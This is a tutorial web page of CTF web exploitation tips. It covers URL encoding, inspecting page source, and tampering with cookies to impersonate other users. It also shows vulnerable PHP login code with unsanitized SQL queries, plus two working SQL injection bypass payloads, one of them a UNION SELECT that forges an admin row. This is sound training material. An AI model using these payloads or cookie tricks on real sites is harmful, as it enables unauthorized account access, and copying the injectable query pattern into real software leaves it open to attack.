<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">


<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <script type="text/javascript">

      var _gaq = _gaq || [];
      _gaq.push(['_setAccount', 'UA-92365403-1']);
      _gaq.push(['_trackPageview']);

      (function() {
        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
      })();
    </script>
    <title>Learning from the CTF : Web Exploitation &#8212; tech.bitvijays.com</title>
    
    <link rel="stylesheet" href="_static/pyramid.css" type="text/css" />
    <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
    
    <script type="text/javascript">
      var DOCUMENTATION_OPTIONS = {
        URL_ROOT:    './',
        VERSION:     '0.1',
        COLLAPSE_INDEX: false,
        FILE_SUFFIX: '.html',
        HAS_SOURCE:  true
      };
    </script>
    <script type="text/javascript" src="_static/jquery.js"></script>
    <script type="text/javascript" src="_static/underscore.js"></script>
    <script type="text/javascript" src="_static/doctools.js"></script>
    <link rel="search" title="Search" href="search.html" />
    <link rel="top" title="tech.bitvijays.com" href="index.html" />
    <link rel="next" title="Learning from the field : Vulnhub" href="LFFVulnhub.html" />
    <link rel="prev" title="Learning from the CTF : Cryptography" href="LFCCryptography.html" />
<!--[if lte IE 6]>
<link rel="stylesheet" href="_static/ie6.css" type="text/css" media="screen" charset="utf-8" />
<![endif]-->

  </head>
  <body role="document">

    <div class="related" role="navigation" aria-label="related navigation">
      <h3>Navigation</h3>
      <ul>
        <li class="right" style="margin-right: 10px">
          <a href="LFFVulnhub.html" title="Learning from the field : Vulnhub"
             accesskey="N">next</a></li>
        <li class="right" >
          <a href="LFCCryptography.html" title="Learning from the CTF : Cryptography"
             accesskey="P">previous</a> |</li>
        <li class="nav-item nav-item-0"><a href="index.html">tech.bitvijays.com</a> &#187;</li> 
      </ul>
    </div>  

    <div class="document">
      <div class="documentwrapper">
        <div class="bodywrapper">
          <div class="body" role="main">
            
  <div class="section" id="learning-from-the-ctf-web-exploitation">
<h1>Learning from the CTF : Web Exploitation<a class="headerlink" href="#learning-from-the-ctf-web-exploitation" title="Permalink to this headline">¶</a></h1>
<p>This post (Work in Progress) lists the tips and tricks while doing Web Exploitation challenges during various CTF’s.</p>
<ul>
<li><p class="first">You may want to use your browser to view the source of the web page. Sometimes, important information is hidden using comments.</p>
</li>
<li><p class="first">It may be helpful to learn how to &#8216;Inspect Elements&#8217; in your browser. It helps you to distinguish each element which might be or not be hidden.</p>
</li>
<li><p class="first">Some symbols need to be URL Encoded when included in GET requests.</p>
<p>Reserved characters after percent-encoding</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>!   <span class="c1">#       $       &amp;       &#39;       (       )       *       +       ,       /       :       ;       =       ?       @       [       ]</span>
%21 %23     %24     %26     %27     %28     %29     %2A     %2B     %2C     %2F     %3A     %3B     %3D     %3F     %40     %5B     %5D
</pre></div>
</div>
<p>Common characters after percent-encoding (ASCII or UTF-8 based)</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>newline                   space   <span class="s2">&quot;       %       -       .       &lt;       &gt;       \       ^       _       `       {       |       }       ~</span>
<span class="s2">%0A or %0D or %0D%0A      %20     %22     %25     %2D     %2E     %3C     %3E     %5C     %5E     %5F     %60     %7B     %7C     %7D     %7E</span>
</pre></div>
</div>
</li>
<li><p class="first">In some web exploitation challenges, if the secret is stored on the client side and there are some javascript involved, you could possibly find the answer in the Javascript console, Browser Developer Tools. (F12 Key).</p>
</li>
<li><p class="first">Websites keep track of you (Whether you are login-ed or not) by keeping a cookie for you, check that if the value (if easy and most probably assigned linearly) of cookie can be changed to any user who might already be logined.</p>
</li>
<li><p class="first">If the Login prompt contains SQL query and check contains only one result if (mysqli_num_rows($result) !== 1), then use limit 1 such as  admin&#8217;   or 1=1 limit 1;#</p>
</li>
</ul>
<blockquote>
<div><div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="o">[</span><span class="s2">&quot;username&quot;</span><span class="o">]</span><span class="p">;</span>
<span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="o">[</span><span class="s2">&quot;password&quot;</span><span class="o">]</span><span class="p">;</span>
<span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users WHERE username=&#39;</span><span class="nv">$username</span><span class="s2">&#39; AND password=&#39;</span><span class="nv">$password</span><span class="s2">&#39;&quot;</span><span class="p">;</span>
<span class="nv">$result</span> <span class="o">=</span> mysqli_query<span class="o">(</span><span class="nv">$con</span>, <span class="nv">$query</span><span class="o">)</span><span class="p">;</span>

<span class="k">if</span> <span class="o">(</span>mysqli_num_rows<span class="o">(</span><span class="nv">$result</span><span class="o">)</span> !<span class="o">==</span> <span class="m">1</span><span class="o">)</span> <span class="o">{</span>
   <span class="nb">echo</span> <span class="s2">&quot;&lt;h1&gt;Login failed.&lt;/h1&gt;&quot;</span><span class="p">;</span>
   <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
   <span class="nb">echo</span> <span class="s2">&quot;&lt;h1&gt;Logged in!&lt;/h1&gt;&quot;</span><span class="p">;</span>
   <span class="nb">echo</span> <span class="s2">&quot;&lt;p&gt;Your flag is: </span><span class="nv">$FLAG</span><span class="s2">&lt;/p&gt;&quot;</span><span class="p">;</span>
<span class="o">}</span>
</pre></div>
</div>
</div></blockquote>
<ul>
<li><p class="first">If the Login prompt contains SQL query and checks only one result, plus have extra checks (see example below), then we can create a fake row  SQL whose value we control.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span> <span class="nv">$con</span> <span class="o">=</span> mysqli_connect<span class="o">(</span><span class="s2">&quot;localhost&quot;</span>, <span class="s2">&quot;sql2&quot;</span>, <span class="s2">&quot;sql2&quot;</span>, <span class="s2">&quot;sql2&quot;</span><span class="o">)</span><span class="p">;</span>
 <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="o">[</span><span class="s2">&quot;username&quot;</span><span class="o">]</span><span class="p">;</span>
 <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="o">[</span><span class="s2">&quot;password&quot;</span><span class="o">]</span><span class="p">;</span>
 <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users WHERE username=&#39;</span><span class="nv">$username</span><span class="s2">&#39;&quot;</span><span class="p">;</span>
 <span class="nv">$result</span> <span class="o">=</span> mysqli_query<span class="o">(</span><span class="nv">$con</span>, <span class="nv">$query</span><span class="o">)</span><span class="p">;</span>

 <span class="nv">$logged_in</span> <span class="o">=</span> false<span class="p">;</span>
 <span class="k">if</span> <span class="o">(</span>mysqli_num_rows<span class="o">(</span><span class="nv">$result</span><span class="o">)</span> <span class="o">===</span> <span class="m">1</span><span class="o">)</span> <span class="o">{</span>
     <span class="nv">$row</span> <span class="o">=</span> mysqli_fetch_array<span class="o">(</span><span class="nv">$result</span><span class="o">)</span><span class="p">;</span>
     <span class="k">if</span> <span class="o">(</span><span class="nv">$row</span><span class="o">[</span><span class="s2">&quot;password&quot;</span><span class="o">]</span> <span class="o">===</span> <span class="nv">$password</span><span class="o">)</span> <span class="o">{</span>
             <span class="nv">$logged_in</span> <span class="o">=</span> true<span class="p">;</span>
             <span class="nb">echo</span> <span class="s2">&quot;&lt;h1&gt;Logged in!&lt;/h1&gt;&quot;</span><span class="p">;</span>
             <span class="nb">echo</span> <span class="s2">&quot;&lt;pre&gt;User level: &quot;</span>, <span class="nv">$row</span><span class="o">[</span><span class="s2">&quot;user_level&quot;</span><span class="o">]</span>,  <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
             <span class="k">if</span> <span class="o">(</span><span class="nv">$row</span><span class="o">[</span><span class="s2">&quot;user_level&quot;</span><span class="o">]</span> &gt;<span class="o">=</span> <span class="m">1337</span><span class="o">)</span> <span class="o">{</span>
                     <span class="nb">echo</span> <span class="s2">&quot;&lt;p&gt;Your flag is: </span><span class="nv">$FLAG</span><span class="s2">&lt;/p&gt;&quot;</span><span class="p">;</span>
                     <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
               <span class="nb">echo</span> <span class="s2">&quot;&lt;p&gt;Only user levels 1337 or above can see the flag.&lt;/p&gt;&quot;</span><span class="p">;</span>
                     <span class="o">}</span>
             <span class="o">}</span>
       <span class="o">}</span>

You have to create a fake query such as
</pre></div>
</div>
</li>
</ul>
<blockquote>
<div><div class="highlight-bash"><div class="highlight"><pre><span></span>random<span class="s1">&#39;AND 1=0 UNION ALL SELECT &#39;</span>admin<span class="s1">&#39; AS username, &#39;</span>hax<span class="s1">&#39; AS password, 2000 AS user_level --</span>
<span class="s1">where</span>
<span class="s1">The &#39;</span> closes the username string and <span class="nv">1</span><span class="o">=</span><span class="m">0</span> will always <span class="k">return</span> false, invalidating the first half.
The union all statement allows us to concatenate two SQL <span class="k">select</span> queries, so we append UNION ALL and <span class="k">then</span> our fake <span class="k">select</span> statement.
</pre></div>
</div>
<p>Don&#8217;t forget to enter the same password in the password field :P</p>
</div></blockquote>
<ul class="simple">
<li>Perl Script running on a webpage, read <a class="reference external" href="http://www.cgisecurity.com/lib/sips.html">Security Issues in Perl Scripts</a>.</li>
<li>In some web exploitation excercises, you can modify the GET/POST request in the burpsuite to get the flag.</li>
</ul>
</div>


          </div>
        </div>
      </div>
      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
        <div class="sphinxsidebarwrapper">
  <h4>Previous topic</h4>
  <p class="topless"><a href="LFCCryptography.html"
                        title="previous chapter">Learning from the CTF : Cryptography</a></p>
  <h4>Next topic</h4>
  <p class="topless"><a href="LFFVulnhub.html"
                        title="next chapter">Learning from the field : Vulnhub</a></p>
<div id="searchbox" style="display: none" role="search">
  <h3>Quick search</h3>
    <form class="search" action="search.html" method="get">
      <div><input type="text" name="q" /></div>
      <div><input type="submit" value="Go" /></div>
      <input type="hidden" name="check_keywords" value="yes" />
      <input type="hidden" name="area" value="default" />
    </form>
</div>
<script type="text/javascript">$('#searchbox').show(0);</script>
        </div>
      </div>
      <div class="clearer"></div>
    </div>
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>Navigation</h3>
      <ul>
        <li class="right" style="margin-right: 10px">
          <a href="LFFVulnhub.html" title="Learning from the field : Vulnhub"
             >next</a></li>
        <li class="right" >
          <a href="LFCCryptography.html" title="Learning from the CTF : Cryptography"
             >previous</a> |</li>
        <li class="nav-item nav-item-0"><a href="index.html">tech.bitvijays.com</a> &#187;</li> 
      </ul>
    </div>
    <div class="footer" role="contentinfo">
        &#169; Copyright 2017, Vijay Kumar.
    </div>
  </body>
</html>